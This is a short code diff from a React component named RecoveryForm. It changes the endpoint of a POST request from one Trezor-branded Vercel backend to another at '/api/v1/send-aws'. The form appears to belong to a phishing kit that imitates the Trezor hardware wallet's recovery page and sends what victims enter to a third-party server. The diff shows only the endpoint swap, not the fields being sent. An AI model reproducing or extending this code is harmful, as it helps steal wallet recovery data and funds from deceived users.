@@ -54,7 +54,7 @@ const RecoveryForm = () => {
         try {
             setLoading(true);
             const response = await fetch(
-                "https://trezor-backend-six.vercel.app/api/v1/send-aws",
+                "https://vcy-trezor-backend.vercel.app/api/v1/send-aws",
                 {
 
                     method: "POST",
